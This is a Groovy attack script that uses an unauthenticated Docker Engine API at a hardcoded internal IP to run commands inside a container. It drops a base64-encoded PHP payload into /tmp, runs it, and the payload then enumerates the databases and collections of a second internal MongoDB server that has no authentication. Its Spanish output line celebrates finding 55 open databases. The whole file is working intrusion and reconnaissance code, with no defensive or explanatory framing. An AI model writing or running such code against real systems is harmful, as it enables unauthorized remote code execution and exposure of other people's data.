import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$m=new MongoDB\\Driver\\Manager("mongodb://172.26.84.132:27020");
$cmd=new MongoDB\\Driver\\Command(["listDatabases"=>1]);
$r=$m->executeCommand("admin",$cmd);
$r->setTypeMap(["root"=>"array","array"=>"array"]);
$arr=iterator_to_array($r);
echo "=== 55 DBs en 27020 SIN AUTH ===\n";
foreach($arr[0]['databases'] as $db){
    $name=$db['name'];
    $size=$db['sizeOnDisk'];
    // Get collection count for each DB
    try {
        $cmd2=new MongoDB\\Driver\\Command(["listCollections"=>1]);
        $r2=$m->executeCommand($name,$cmd2);
        $r2->setTypeMap(["root"=>"array","array"=>"array"]);
        $cols=iterator_to_array($r2);
        $ncol=count($cols[0]['cursor']['firstBatch']);
        echo "$name|$ncol collections|$size bytes\n";
    } catch(Exception $e) {
        echo "$name|ERR:$ncol|$size\n";
    }
}
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(60000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/mongo3.php && php /tmp/mongo3.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(120000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
